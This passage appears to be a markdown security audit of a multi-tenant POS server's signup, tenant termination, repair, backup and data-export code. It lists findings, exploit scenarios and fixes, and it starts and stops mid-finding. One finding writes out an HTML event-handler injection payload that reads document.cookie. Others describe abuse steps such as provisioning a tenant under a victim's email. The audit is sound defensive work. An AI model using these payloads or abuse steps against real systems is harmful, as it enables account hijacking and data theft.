The PIN is stored in `users.pin` and is available immediately on first login. There is no setup flow that forces the admin to change it before using POS operations that require a PIN challenge. A bcrypt hash is not reversible but the well-known value means any attacker who can log in with the admin's credentials (or who shares the machine) knows the PIN without any brute force.

**Impact:** Privilege escalation within POS terminal — PIN-gated operations (e.g. supervisor override, cash drawer open) are trivially bypassed by any tenant user who reads this source code or knows common defaults.

**Recommendation:**  
Either (a) leave `pin` NULL at provisioning and gate PIN-required flows behind a "set your PIN first" prompt, or (b) force a PIN-change on first login as part of the setup wizard. Document the expected change in the `TEMP-NO-EMAIL-VERIF` comment block so it isn't forgotten during the revert.

---

## FINDING S10-03 — LOW — Tenant Uploads Directory Not Cleaned Up on Termination or Grace-Period Archive

**File:** `packages/server/src/services/tenantTermination.ts` (`executeTermination`), `packages/server/src/services/tenant-provisioning.ts` (`archiveTenantDb`, `archiveDueTenants`)

**Description:**  
`executeTermination()` renames the SQLite DB file and WAL/SHM sidecars into `deleted/` but never touches the tenant uploads directory at `config.uploadsPath/<slug>/`. `archiveTenantDb()` and `archiveDueTenants()` similarly only move the `.db` file; no code removes or archives the uploads directory along the grace-period path. `purgeExpiredDeletions()` (the 30-day final purge) also only unlinks `.db` files.

The uploads directory is cleaned in `cleanup()` (failed provisioning rollback) and in `quarantineStaleProvisioningRecords()`, but not in any successful termination path.

**Impact:**  
Terminated tenant's uploaded files (customer photos, invoice attachments) persist on the server filesystem indefinitely after account deletion. This is a data-retention / GDPR residual-data gap. Storage also grows unbounded after each cancellation.

**Recommendation:**  
In `executeTermination()`, after renaming the DB, also rename or remove `config.uploadsPath/<slug>/` into the `deleted/` directory (or a separate `deleted-uploads/` directory). Mirror this cleanup in `archiveDueTenants()` and `purgeExpiredDeletions()`.

---

## FINDING S10-04 — LOW — `repairTenant` Can Flip Any Non-Active Tenant to "active" Status

**File:** `packages/server/src/services/tenant-repair.ts` lines 175–182

**Description:**  
`repairTenant()` unconditionally sets `status = 'active'` for any tenant that is NOT already active, including `suspended` and `quarantined` tenants, so long as the master row exists and the status is not `deleted` or `pending_deletion`:

```ts
if (row.status !== 'active') {
  masterDb.prepare(
    "UPDATE tenants SET status = 'active', provisioning_step = NULL, updated_at = datetime('now') WHERE id = ?"
  ).run(row.id);
  push('7/7 status', `flipped from "${row.status}" to "active"`);
}
```

The repair endpoint is gated behind `requireStepUpTotpSuperAdmin('super_admin_tenant_repair')`, so a regular tenant user cannot trigger it. However, a super-admin performing a structural repair on a legitimately suspended tenant would inadvertently re-activate it.

**Impact:** A suspended tenant (e.g. overdue for payment, under abuse review) is silently re-activated when repair is run. The step log will show the flip but the operator may not notice.

**Recommendation:**  
In `repairTenant()` check for `suspended` status and skip the activation step, or return it as a warning in the step log. The repair tool should only flip `provisioning` and `quarantined` rows to `active`, not `suspended` ones.

---

## FINDING S10-05 — INFO — Archived DB Files Have No Explicit Filesystem Permissions Set

**File:** `packages/server/src/services/tenant-provisioning.ts` (`archiveTenantDb`, `quarantineStaleProvisioningRecords`), `packages/server/src/services/tenantTermination.ts` (`executeTermination`)

**Description:**  
All `fs.renameSync`, `fs.mkdirSync`, and `fs.copyFileSync` calls use Node.js defaults — the file/directory mode is inherited from the process umask. There is no explicit `mode` argument on `fs.mkdirSync` for the `archive/`, `deleted/`, `.quarantine/`, or per-tenant directories. Depending on the deployment's umask, these directories may be world-readable (e.g. `umask 022` → `0755`).

**Impact:** Low in a properly containerised deployment, but if the server runs with a permissive umask or if archive directories are served by a co-located web server, other processes or OS users could read tenant DB backups.

**Recommendation:**  
Pass explicit `mode: 0o700` (or `0o750` if the web-server group needs read access) on all `mkdirSync` calls for archive, deleted, quarantine directories. Consider `fs.chmodSync` on each renamed/copied file to `0o600`.

---

## FINDING S10-06 — INFO — Token Reference Logged in Plain Text for Operator Recovery (SCAN-743)

**File:** `packages/server/src/routes/signup.routes.ts` line 715

**Description:**  
A design tradeoff (SCAN-743) intentionally logs the first 8 hex characters of the verification token (`tokenPrefix`) so that operators can re-send a signup email after a process restart. Eight hex characters = 32 bits of entropy, leaving 192 bits secret — this is low risk on its own. However, if log aggregation pipelines are not adequately access-controlled, this provides a marginal reduction in the effective token entropy for an attacker who has log read access.

**Impact:** Informational — only reduces token entropy by 32 bits; still 192 bits remaining. Not exploitable without log access.

**Recommendation:**  
Acknowledge as accepted risk (as SCAN-743 does). If log access is broadly granted, consider dropping the prefix log line or moving it to a debug level.

---

## Summary

| ID | Severity | Title |
|----|----------|-------|
| S10-01 | MEDIUM | Plaintext password in in-memory pending-signup map |
| S10-02 | MEDIUM | Hardcoded default PIN "1234" provisioned for every admin |
| S10-03 | LOW | Uploads directory not cleaned on termination/archive |
| S10-04 | LOW | `repairTenant` unconditionally re-activates suspended tenants |
| S10-05 | INFO | No explicit mode on archive/deleted/quarantine directory creation |
| S10-06 | INFO | Verification token prefix logged (SCAN-743 accepted tradeoff) |

---

## PASS 2 — DEEP DIVE

**Auditor:** Slot 10 Pass 2 (automated)
**Date:** 2026-05-05
**Additional files reviewed:**
- `packages/server/src/routes/signup.routes.ts` (full re-read)
- `packages/server/src/services/tenant-repair.ts` (full re-read)
- `packages/server/src/services/tenantTermination.ts` (full re-read)
- `packages/server/src/services/sampleData.ts` (full re-read)
- `packages/server/src/db/template.ts` (full re-read)
- `packages/server/src/services/cloudflareDns.ts` (full re-read)
- `packages/server/src/routes/super-admin.routes.ts` (repair/drop endpoints, full context)
- `packages/server/src/services/tenantExport.ts` (export file lifecycle)
- `packages/server/src/routes/tenantExport.routes.ts` (download router, auth check)
- `packages/server/src/routes/admin.routes.ts` (termination flow)
- `packages/server/src/index.ts` (cron wiring, forEachDbAsync, middleware order)
- All 158 migration filenames surveyed for table inventory

---

### HIGH — Email ownership not verified: `skipEmailVerification = true` in production

**Where:** `packages/server/src/routes/signup.routes.ts:618`

**What:**
The constant `skipEmailVerification` is unconditionally set to `true` with no `NODE_ENV` guard. The comment at line 614 shows the intended expression (`process.env.SKIP_EMAIL_VERIFICATION === '1' && config.nodeEnv !== 'production'`), but this was replaced with a bare `true` during a SMTP troubleshooting session and never reverted. In production, `POST /api/v1/signup` immediately provisions a tenant and issues JWT access + refresh tokens without ever proving that the caller controls `admin_email`.

**Code:**
```typescript
// TEMP-NO-EMAIL-VERIF (2026-04-24): email verification fully disabled
// Restore: const skipEmailVerification = process.env.SKIP_EMAIL_VERIFICATION === '1' && config.nodeEnv !== 'production';
// While this is `true`, /signup provisions tenants synchronously without
// proving control of the email — re-enable before opening signup to the public internet.
const skipEmailVerification = true;
if (skipEmailVerification) {
  logger.warn('signup: TEMP-NO-EMAIL-VERIF — email verification disabled', ...);
  const result = await provisionTenant({ slug, adminEmail: normalizedEmail, adminPassword, ... });
  // ... returns accessToken + refreshToken immediately
}
```

**Exploit:**
An attacker submits `POST /api/v1/signup` with `admin_email: victim@example.com`. The server provisions a full tenant DB, creates an admin user with victim's email address, and returns a live `accessToken` to the attacker — all without the victim receiving or clicking a verification link. The victim's email is now permanently burned in `tenants.admin_email` (UNAVAILABLE_STATUSES prevents reclaim). The attacker controls a shop provisioned under the victim's identity.

**Fix:**
Revert to the env-gated expression: `const skipEmailVerification = process.env.SKIP_EMAIL_VERIFICATION === '1' && config.nodeEnv !== 'production';` and ensure this resolves to `false` in production. If SMTP is still broken in prod, disable new signups entirely until SMTP is confirmed working — do not bypass email verification as a workaround.

---

### MEDIUM — Encrypted export files (.enc) not deleted on tenant termination

**Where:** `packages/server/src/services/tenantTermination.ts` (`executeTermination`, `purgeExpiredDeletions`); `packages/server/src/routes/tenantExport.routes.ts:57-58` (`getExportsDir`)

**What:**
`executeTermination()` and `purgeExpiredDeletions()` move/delete only the tenant's `.db` file. Encrypted export archives (`tenant-export-<tenantId>-<ts>.enc`) are written to a shared platform-level directory (`data/exports/`, derived from `config.uploadsPath/../data/exports`). The retention sweeper `sweepOldExports()` runs per-tenant via `forEachDbAsync`, which queries `SELECT slug FROM tenants WHERE status = 'active'`. A terminated tenant's DB has been renamed, so it is never iterated, and `sweepOldExports` is never called for it. The `.enc` files accumulate on disk indefinitely after termination.

**Code:**
```typescript
// tenantExport.routes.ts:57-58
function getExportsDir(): string {
  return path.resolve(config.uploadsPath, '..', 'data', 'exports'); // shared platform dir
}
// tenantTermination.ts executeTermination() — only renames tenant .db file:
fs.renameSync(srcPath, archivedPath);  // moves db file
// No code touches data/exports/ for the terminated tenant
```

**Exploit:**
A tenant admin requests a full GDPR export, then terminates the account. The encrypted `.enc` file (which contains all customer PII, tickets, invoices) remains on disk beyond the 30-day grace period and is never purged. This violates GDPR Article 17 (right to erasure): the operator has confirmed deletion but customer PII survives on disk.

**Fix:**
In `executeTermination()`, enumerate and delete (or move to `deleted/`) any `tenant-export-<tenantId>-*.enc` files from the exports directory. Alternatively, store export files in a per-tenant subdirectory (e.g., `data/exports/<slug>/`) and include that directory in the termination cleanup, mirroring the same pattern applied to `uploads/<slug>/`.

---

### LOW — Repair of quarantined tenant recreates DB from template and activates it

**Where:** `packages/server/src/services/tenant-repair.ts:76-84`, `packages/server/src/services/tenant-provisioning.ts:851-862` (`quarantineStaleProvisioningRecords`)

**What:**
`quarantineStaleProvisioningRecords()` marks stuck provisioning rows as `status='quarantined'` and sets `db_path=''`. `repairTenant()` only blocks repair for `deleted` and `pending_deletion` status; `quarantined` rows pass through. Because `db_path=''`, the fallback `row.db_path || \`${slug}.db\`` resolves to `slug.db`. If that file does not exist, `repairTenant` copies the template DB to `slug.db`, runs migrations, optionally creates a setup token, creates the uploads directory, creates a Cloudflare DNS record, and then flips status to `active`. A quarantined provisioning record (which was quarantined because provisioning originally failed mid-flight) is resurrected into a live tenant.

**Code:**
```typescript
// tenant-repair.ts:76-84
if (row.status === 'deleted' || row.status === 'pending_deletion') {
  return { success: false, ... }; // quarantined NOT blocked
}
const tenantDbPath = path.join(config.tenantDataDir, row.db_path || `${slug}.db`);
// If quarantined: db_path='', falls back to slug.db
// If slug.db doesn't exist, copies from template and activates
```

**Exploit:**
A super-admin running repair on a legitimately quarantined slug (e.g., a slug that failed provisioning and was quarantined to prevent DNS takeover) will unknowingly activate a fresh tenant under that slug. The quarantine state was intended to permanently retire the provisioning attempt; repair bypasses this intent.

**Fix:**
Add `quarantined` to the blocked-status check in `repairTenant()`: `if (['deleted', 'pending_deletion', 'quarantined'].includes(row.status)) { return error; }`. Quarantined tenants should require explicit super-admin decision to either fully delete or de-quarantine, not be resurrectable via repair.

---

### LOW — Missing rate limit on `POST /api/v1/admin/terminate-tenant` (action=request)

**Where:** `packages/server/src/routes/admin.routes.ts:201-248`

**What:**
The termination endpoint accepts `action=request` to mint a new in-memory termination token and optionally send a notification email. There is no rate limit beyond the `authMiddleware` authentication check. The in-memory `tokens` Map in `tenantTermination.ts` has no cap (unlike the `challenges` Map in super-admin routes which has `CHALLENGES_CAP=1000` enforced by `addWithCap`). An authenticated tenant admin can call `action=request` in a tight loop, minting thousands of tokens and sending thousands of notification emails (if SMTP is configured) within the 5-minute token TTL window.

**Code:**
```typescript
// admin.routes.ts:200-248 — no rate limit guard before requestTermination()
router.post('/terminate-tenant', authMiddleware, async (req, res) => {
  if (action === 'request') {
    const { token, expiresAt } = await requestTermination({...});
    // tokens.set(token, ...) — no Map cap
    // sendEmail(tenantDb, ...) — can trigger SMTP on every call
  }
});
```

**Exploit:**
A disgruntled tenant admin scripts repeated `action=request` calls, flooding the tenant's SMTP relay with "Account Termination Requested" alert emails (DoS to inbox). At higher volume (unlikely due to per-request latency), it could grow the in-memory tokens Map to a few MB, though the 60-second sweeper limits accumulation.

**Fix:**
Apply a rate limit (e.g., 3 requests per 10 minutes per tenant+user combination) using `checkWindowRate` on the tenant DB. Add a Map cap to the `tokens` Map in `tenantTermination.ts` using the same `addWithCap` pattern used for `challenges` in super-admin routes.

---

### INFO — Repair setup-token fallback writes raw token to `store_config` (unreachable by auth, but unexpected plaintext)

**Where:** `packages/server/src/services/tenant-repair.ts:133-138`

**What:**
When the primary `INSERT INTO setup_tokens` fails (e.g., table missing after schema gap), the catch block stores the **raw** (unhashed) setup token in `store_config` under the key `setup_token`. However, `POST /auth/setup` only reads from the `setup_tokens` table (by SHA-256 hash); it never reads `store_config.setup_token` for authentication. The result is a broken setup URL (the token cannot be redeemed), and a plaintext token sitting in `store_config` until a later `auth/setup` call purges it (`DELETE FROM store_config WHERE key IN ('setup_token', 'setup_token_expires')` at auth.routes.ts:694). The plaintext token cannot be used for authentication but may surprise future auditors.

**Code:**
```typescript
try {
  tenantDb.prepare('INSERT INTO setup_tokens (tenant_id, token_hash, expires_at) VALUES (?, ?, ?)').run(row.id, tokenHash, setupExpiry);
} catch {
  // Fallback: stores RAW token, not hash — auth/setup never reads this
  tenantDb.prepare("INSERT OR REPLACE INTO store_config (key, value) VALUES ('setup_token', ?)").run(setupToken);
}
const setupUrl = `https://${slug}.${baseDomain}/auth/setup?token=${setupToken}`;
// ^ This URL is broken: auth/setup checks setup_tokens, not store_config
```

**Exploit:**
Primarily a usability gap: a super-admin performing repair on a tenant where `setup_tokens` table is missing receives a `setup_url` that silently fails at `/auth/setup`. The operator cannot bootstrap the admin user via the returned URL and must re-run repair after applying the missing migration.

**Fix:**
Remove the catch-fallback entirely. If `setup_tokens` table is missing, repair should explicitly fail with a clear message pointing to the missing migration. Adding a migration check (`runMigrations(tenantDb)` already occurs at step 3) before attempting the insert should prevent this path. Delete the store_config fallback.

---

### INFO — Verified safe: sample data uses `example.com` + E.164 555 phones, no real-domain emails sent

**Where:** `packages/server/src/services/sampleData.ts:83-89`

**What:**
All five seed customers use `@example.com` email addresses (IANA-reserved) and `303555010x` phone numbers (North American Numbering Plan 555-01xx block reserved for fictional use per NANPA). No `sendEmail` or `sendSms` calls exist in `sampleData.ts`. Customer `email_opt_in` and `sms_opt_in` are both set to `0`, so no automated marketing pipeline will contact them.

---

## PASS 2 — Summary

| ID | Severity | Title |
|----|----------|-------|
| S10-07 | HIGH | `skipEmailVerification = true` hardcoded — no email ownership proof in production |
| S10-08 | MEDIUM | Encrypted tenant export files (.enc) not deleted on termination |
| S10-09 | LOW | Repair of quarantined tenant recreates DB from template and activates it |
| S10-10 | LOW | No rate limit on `terminate-tenant` action=request (SMTP flood vector) |
| S10-11 | INFO | Repair setup-token fallback stores raw token in store_config (unusable but unexpected) |
| S10-12 | INFO | Sample data verified safe (example.com, 555-01xx, no emails sent) |

### Not Found / Confirmed Mitigated (Pass 2)

- **Slug injection / path traversal:** `cloudflareDns.ts:buildRecordName()` validates slug with `/^[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/i` before any DNS API call; `tenant-repair.ts:50` validates with SLUG_REGEX before any `path.join`. No traversal vector.
- **Termination token double-use:** Token is deleted from the `tokens` Map at line 260 of `tenantTermination.ts` (`tokens.delete(input.token)`) before `executeTermination()` is called. Concurrent replay of the same token hits `tokens.get` → undefined → `{ ok: false }`.
- **Backup tar with absolute paths:** No `tar` usage found anywhere in the codebase; archival uses `fs.renameSync` (same filesystem) or `fs.copyFileSync`, which copy only the file content — no header with absolute paths.
- **Download token accessible after termination:** The `downloadRouter` is mounted after `tenantResolver` (index.ts:1276 vs 1651). `tenantResolver` sets `req.db` to the tenant DB; for a terminated tenant, `tenantResolver` returns 404 (status not active), so the download endpoint is unreachable. The `.enc` file remains on disk but cannot be downloaded via the API.
- **Super-admin repair/drop accessible by tenant user:** Both `POST /tenants/:slug/repair` and `DELETE /tenants/:slug` are behind `requireStepUpTotpSuperAdmin` — tenant users cannot reach them.
- **XSS in termination email:** All dynamic values (`slug`, `adminUsername`, `requestIp`, `expiresAt`, `appUrl`) pass through `escapeHtml()` at tenantTermination.ts:530-545.
- **Sample data credentials in template DB:** `db/template.ts` documents "Users are NOT seeded" and `sampleData.ts` contains no credentials — only generic fixture data.

### Not Found / Confirmed Mitigated

- **Slug/path injection:** Slug is validated by `SLUG_REGEX` (`/^[a-z0-9]([a-z0-9-]*[a-z0-9])?$/`) before any `path.join` usage. No traversal vector found.
- **Race condition on slug:** Master DB `UNIQUE` constraint on `slug` + "reserve first" pattern prevents concurrent duplicate provisioning.
- **Free-tier abuse / mass signup:** IP rate limit (3/hr), per-email rate limit (3/hr), hCaptcha on signup and on slug-check after 3 free checks.
- **Repair accessible by tenant user:** Repair endpoint is behind `requireStepUpTotpSuperAdmin` — tenant users cannot reach it.
- **Sample data hardcoded credentials:** No users/credentials in sample data — only customers, tickets, invoices, inventory items with `example.com` emails and 555-01xx phone numbers. Template DB explicitly documents "Users are NOT seeded."
- **Backup with absolute paths / world-readable perms (tar):** No `tar` backup creation found in this codebase; backups are plain file copies/renames.
- **Tenant accessible after termination:** `tenantResolver.ts` blocks `suspended`, `pending_deletion`, `deleted`, and non-`active` status at the HTTP layer on every request.
- **Sessions/JWTs valid after termination:** DB file rename makes session-table lookups fail; `closeTenantDb` evicts the pool handle. Implicit but effective.
- **`archiveDueTenants` not wired to cron:** Wired in `index.ts` (line 2644) on a 24-hour `trackInterval`; the in-code TODO comment is stale.


---

# S11-data-export

# S11 — Tenant Export & Data Export Security Findings

**Auditor:** Claude (Slot 11)
**Date:** 2026-05-05
**Scope:** `packages/server/src/services/tenantExport.ts`, `tenantExport.routes.ts`, `dataExport.routes.ts`, `dataExportSchedules.routes.ts`, `dataExportGenerator.ts`, `dataExportScheduleCron.ts`, `backup.ts`

---

## FINDING S11-01 — LOW — Internal Filesystem Path Leaked in Schedule-Run API Response

**File:** `packages/server/src/routes/dataExportSchedules.routes.ts:118`

**Description:**
The `GET /api/v1/data-export/schedules/:id` endpoint fetches the last 20 runs via:

```sql
SELECT id, schedule_id, run_at, succeeded, export_file, error_message
  FROM data_export_schedule_runs
 WHERE schedule_id = ?
 ORDER BY run_at DESC LIMIT 20
```

The `export_file` column contains the absolute server-side filesystem path (e.g. `/opt/app/data/exports/acme/export-full-2026-05-05-a1b2c3.json`). This path is returned verbatim in the JSON response to authenticated admin users.

**Risk:** Exposes internal directory layout (install location, slug-to-path mapping). Useful to an attacker who already has admin credentials for further reconnaissance. Not directly exploitable on its own, but violates least-information principle.

**Recommendation:** Strip `export_file` from the API response or replace it with only `path.basename(export_file)`. The full path serves no UI purpose — the file is generated server-side and not directly downloadable via this route.

---

## FINDING S11-02 — LOW — `dataExportGenerator` EXCLUDED_TABLES Missing Two Entries vs `tenantExport`

**File:** `packages/server/src/services/dataExportGenerator.ts:58-71`

**Description:**
`tenantExport.ts` excludes `idempotency_keys` and `import_rate_limits` from the full export (in addition to the base set). `dataExportGenerator.ts` — used by the HTTP data-export route and scheduled exports — has a separately maintained `EXCLUDED_TABLES` constant that does NOT exclude `idempotency_keys` or `import_rate_limits`.

Both files include a comment warning that the lists must be kept in sync but there is no enforcement.

```
tenantExport EXCLUDED_TABLES extra entries:
  'idempotency_keys'      ← absent from dataExportGenerator
  'import_rate_limits'    ← absent from dataExportGenerator
  'tenant_exports'        ← absent from dataExportGenerator (contains download tokens)
```

`tenant_exports` being absent is the most significant: this table stores raw 64-hex download tokens (single-use, 1-hour expiry). Including it in a scheduled JSON export means a freshly issued token would appear in the next scheduled export file before it expires. An attacker with access to that export file during the 1-hour window could replay the token to download the full encrypted tenant ZIP without admin credentials.

**Risk:** If a scheduled export is readable by an attacker (e.g. misconfigured delivery email, leaked export file), they could extract a valid download token. Token is single-use and 1-hour TTL, limiting but not eliminating risk. The exported token is for the encrypted tenant ZIP, not the plain JSON export, which amplifies impact.

**Recommendation:** Add `'tenant_exports'`, `'idempotency_keys'`, and `'import_rate_limits'` to `EXCLUDED_TABLES` in `dataExportGenerator.ts`. Consider consolidating both lists to a single shared constant in a common module to prevent future drift.

---

## FINDING S11-03 — LOW — Backup Cron Expression Accepts Second-Precision `* * * * * *` (Resource Exhaustion)

**Files:**
- `packages/server/src/routes/admin.routes.ts:620-625`
- `packages/server/src/services/backup.ts:1255-1256`

**Description:**
`PUT /admin/backup-settings` accepts a `schedule` field and validates only `typeof schedule === 'string' && schedule.length <= 100`. The value is persisted to `store_config.backup_schedule` and fed to `cron.schedule()` in `scheduleBackup()`.

`node-cron` v3 (in use at `^3.0.3`) supports 6-field expressions where the first field is seconds. `cron.validate('* * * * * *')` returns `true`, so a 6-field every-second expression passes both the length check and the `cron.validate()` guard. An admin can set the backup cron to fire every second, triggering continuous concurrent `runBackup()` calls.

The per-tenant in-process mutex (`acquireTenantBackupLock`) prevents overlapping backup runs for the same tenant, so concurrent runs are blocked. However, the cron fires every second, and each invocation still acquires a lock, attempts disk-space pre-checks (including `execFile('df', ...)` with a 5-second timeout), and may queue additional attempts. On a busy server this can cause disk I/O saturation and event-loop pressure.

**Risk:** Authenticated admin can cause sustained I/O and CPU load by setting `backup_schedule` to a second-granularity cron. The mutex limits actual backup execution, but the cron overhead itself is not bounded.

**Recommendation:** In `PUT /admin/backup-settings`, after the string/length check, validate the expression does not contain a sixth (seconds) field, or enforce a minimum interval. Simplest fix: reject if `cron.validate()` passes but the expression has more than 5 space-separated fields; or use a minimum-interval allowlist (no finer than `*/5 * * * *`).

---

## NO FINDINGS — items verified clean

- **Cross-tenant export:** `tenantExport.ts` scopes all queries by `tenant_id`; `getExportJob` uses `WHERE id = ? AND tenant_id = ?`. Schedule cron uses per-tenant DB isolation (separate SQLite files), no cross-DB access possible.
- **Export URL leakage / predictable filename:** `tenantExport.ts` uses `crypto.randomBytes(32).toString('hex')` for download tokens (opaque 64-hex, single-use, 1-hour TTL). `dataExportGenerator.ts` filenames use `crypto.randomBytes(6).toString('hex')` nonce. Neither is predictable.
- **Public S3/local-fs access without expiry:** Export files are served only via the signed-token route with expiry; local exports directory is not served statically (the `/uploads` path requires `authMiddleware`; exports go to a separate `data/exports` path not served directly).
- **Export auth bypass / anonymous scheduler endpoint:** Download endpoint is public-by-design (token IS the credential); admin initiation requires admin role + step-up TOTP. No localhost-only bypass. Scheduler cron fires internally, not via an HTTP endpoint.
- **Secrets in export:** `tenantExport.ts` and `dataExportGenerator.ts` both redact `password_hash`, `totp_secret`, `pin_hash`, `recovery_codes`, `reset_token_hash`, `remember_token_hash` from `users`, and redact all `SENSITIVE_CONFIG_KEYS` values from `store_config`. Auth tables (`sessions`, `refresh_tokens`, `admin_tokens`, `pending_2fa_challenges`) are excluded entirely.
- **Zip-slip (export creates files):** `collectUploads()` in `tenantExport.ts` validates every resolved path starts with `resolvedBase + path.sep`; table names are sanitized to `[a-zA-Z0-9_-]` before use as ZIP entry names.
- **Backup.ts writes to user-controlled destination:** `backup_path` is validated (`!includes('..')`, max 500 chars) and `assertSafePath()` rejects shell metacharacters before any `execFile` use. The `runBackup` path uses `path.join(backupDir, ...)` — no user-supplied suffix injected into the filename.
- **Restore cross-tenant swap:** SEC-H60 HMAC-signed sidecar binds each backup file to its `(slug, tenant_id)` pair; `restoreBackup()` verifies the sidecar before decrypting.

---

## PASS 2 — DEEP DIVE

### HIGH — Multi-tenant per-tenant backup copies ALL tenants' uploads (cross-tenant file exposure)

**Where:** `packages/server/src/services/backup.ts:630–631`

**What:**
`runBackup()` is called per-tenant by `scheduleMultiTenantBackups()`, but the uploads copy step always copies `config.uploadsPath` — the global uploads root — rather than the tenant's own subdirectory (`config.uploadsPath/<slug>/`). In multi-tenant deployments each tenant's files are stored under their own slug subdirectory, so every per-tenant backup receives the entire uploads tree including all other tenants' uploaded files (photos, attachments, voice recordings, shrinkage images).

**Code:**
```typescript
// backup.ts:629-631
// Copy uploads folder (async to avoid blocking the event loop)
if (fs.existsSync(config.uploadsPath)) {
  await fsp.cp(config.uploadsPath, uploadsDest, { recursive: true });
}
```

**Exploit:**
Tenant A's admin configures a backup destination they control (e.g., a mounted NFS share or a mapped drive). The nightly per-tenant backup for tenant A copies `uploads/*` including `uploads/tenant-b/`, `uploads/tenant-c/`, etc. Tenant A now has access to all other tenants' uploaded files — customer photos, signed documents, voice recordings.

**Fix:**
When `opts.tenantSlug` is set, copy only `path.join(config.uploadsPath, opts.tenantSlug)` instead of `config.uploadsPath`. Guard with `fs.existsSync` and use `path.resolve`/startsWith check to ensure the slug-derived path stays within `config.uploadsPath`.

---

### MEDIUM — `interval_count` has no upper bound; extreme values make `next_run_at` overflow to `Invalid Date`

**Where:** `packages/server/src/routes/dataExportSchedules.routes.ts:47–52` and `packages/server/src/routes/dataExportSchedules.routes.ts:63–71`

**What:**
`validatePositiveInt` accepts any positive integer without a ceiling. `advanceScheduleNextRun` passes the count directly to `Date.setUTCDate()` or `Date.setUTCMonth()`. For `count > Number.MAX_SAFE_INTEGER / 7` (weekly) or similar, the arithmetic overflows to `NaN`, `setUTCDate(NaN)` produces `Invalid Date`, and `d.toISOString()` throws `RangeError: Invalid time value`. If the error is uncaught it terminates the cron run for that tenant; if caught by the outer try/catch the schedule row is left with a poisoned `next_run_at` that can never satisfy `<= datetime('now')`, effectively permanently disabling the schedule without surfacing a user-visible error.

**Code:**
```typescript
function validatePositiveInt(raw: unknown, field: string): number {
  const n = Number(raw);
  if (!Number.isInteger(n) || n <= 0) {
    throw new AppError(`${field} must be a positive integer`, 400);
  }
  return n;  // no upper bound
}

function advanceScheduleNextRun(current: string, kind: IntervalKind, count: number): string {
  const d = new Date(/* ... */);
  switch (kind) {
    case 'weekly':  d.setUTCDate(d.getUTCDate() + 7 * count); break; // can overflow
  }
  return d.toISOString(); // throws RangeError if d is Invalid Date
}
```

**Exploit:**
An admin POSTs `{ interval_kind: 'weekly', interval_count: 9007199254740991 }`. The schedule is created. On the next cron tick, `advanceScheduleNextRun` throws, the claim UPDATE fires but the run-record INSERT fails. The schedule's `next_run_at` is permanently poisoned or the cron for that tenant crashes.

**Fix:**
Add an upper bound in `validatePositiveInt` or separately: `if (n > 3650) throw new AppError('interval_count must be ≤ 3650', 400)` (10 years of daily intervals). Also wrap `advanceScheduleNextRun` to check `isNaN(d.getTime())` and throw a meaningful error rather than surfacing `RangeError`.

---

### MEDIUM — Schedule delivery email notification embeds `schedule.name` in HTML without escaping

**Where:** `packages/server/src/services/dataExportScheduleCron.ts:231–233`

**What:**
The cron delivery email injects `schedule.name` (an admin-authored string, up to 200 chars, no HTML encoding) directly into an HTML template string. The downstream `sanitizeEmailHtml()` in `email.ts` strips `<script>` blocks and `\s+on*=` event handlers via regex, but does not HTML-encode `<`, `>`, or `"`. Attacker-controlled HTML structure (injected via schedule name) can break out of the `<strong>` context and add arbitrary HTML elements or attributes. The regex sanitizer misses `onerror` when there is no leading whitespace before the attribute and tag does not contain a `<script>` block.

**Code:**
```typescript
// dataExportScheduleCron.ts:231-233
subject: `Data export ready — ${schedule.name}`,
html: [
  `<p>Your scheduled data export "<strong>${schedule.name}</strong>" has completed.</p>`,
```

**Exploit:**
An admin creates a schedule named `</strong></p><img src=x onerror=alert(document.cookie)><p><strong>`. The notification email sent to `delivery_email` contains the injected HTML. Depending on the recipient's email client and whether it renders HTML (which most do), the image load triggers the event handler. Impact is limited to the single delivery_email recipient; however, in phishing scenarios the attacker-controlled admin could set `delivery_email` to a target address.

**Fix:**
HTML-encode `schedule.name` before embedding: `schedule.name.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;')`. Apply the same encoding to `exportType` and `fileName`. Alternatively move to a template engine that auto-escapes by default.

---

### MEDIUM — `sms_vonage_api_key` and `sms_plivo_auth_id` exported in plaintext (incomplete secret redaction)

**Where:** `packages/server/src/services/dataExportGenerator.ts:85–97`

**What:**
`SENSITIVE_CONFIG_KEYS` in `dataExportGenerator.ts` (and `tenantExport.ts`) redacts the secret/token halves of SMS provider credentials but leaves the identifier halves — `sms_vonage_api_key` and `sms_plivo_auth_id` — in plaintext in exports. Both values are required alongside their respective secrets to authenticate API calls against Vonage and Plivo, and both are treated as confidential by those providers' security documentation. An export delivered via a scheduled email or to a misconfigured destination exposes these values.

**Code:**
```typescript
// dataExportGenerator.ts:85-97 — SENSITIVE_CONFIG_KEYS omits:
//   'sms_vonage_api_key'    (Vonage account API key — used with api_secret for auth)
//   'sms_plivo_auth_id'     (Plivo Auth ID — used with auth_token for Basic auth)
const SENSITIVE_CONFIG_KEYS = new Set<string>([
  'sms_twilio_auth_token', 'sms_telnyx_api_key', 'sms_bandwidth_password',
  'sms_plivo_auth_token', 'sms_vonage_api_secret',  // ← secrets but not identifiers
  'smtp_pass', 'stripe_secret_key', ...
]);
```

**Exploit:**
A data export (either on-demand JSON or a scheduled export) includes `{ key: 'sms_vonage_api_key', value: 'abc123' }` and `{ key: 'sms_plivo_auth_id', value: 'MAXXXXXXXXX' }`. Anyone who obtains the export (e.g., via the email notification, an exposed export file, or the download token window) and also knows or guesses the companion secrets can impersonate the tenant's SMS account to send fraudulent messages.

**Fix:**
Add `'sms_vonage_api_key'`, `'sms_plivo_auth_id'`, `'sms_bandwidth_account_id'`, and `'sms_vonage_application_id'` to `SENSITIVE_CONFIG_KEYS` in both `dataExportGenerator.ts` and `tenantExport.ts`. A recipient performing a legitimate restore will re-enter these credentials.

---

### LOW — Data export schedule cron silently skips single-tenant installations

**Where:** `packages/server/src/index.ts:2156–2161`

**What:**
The data export schedule cron is wired with a lambda that calls `forEachDb` and then filters `if (slug && db)`. In single-tenant mode `forEachDb` calls the callback with `slug = null`, so the filter `null && db` is falsy and the single-tenant DB is never passed to the cron. Any `data_export_schedules` rows created by a single-tenant admin will never fire; no error is surfaced.

**Code:**
```typescript
// index.ts:2156-2161
const dataExportScheduleTimer = startDataExportScheduleCron(() => {
  const entries: Array<{ slug: string; db: any }> = [];
  forEachDb((slug, db) => {
    if (slug && db) entries.push({ slug, db }); // null slug → excluded
  });
  return entries as unknown as Iterable<any>;
});
```

**Exploit:**
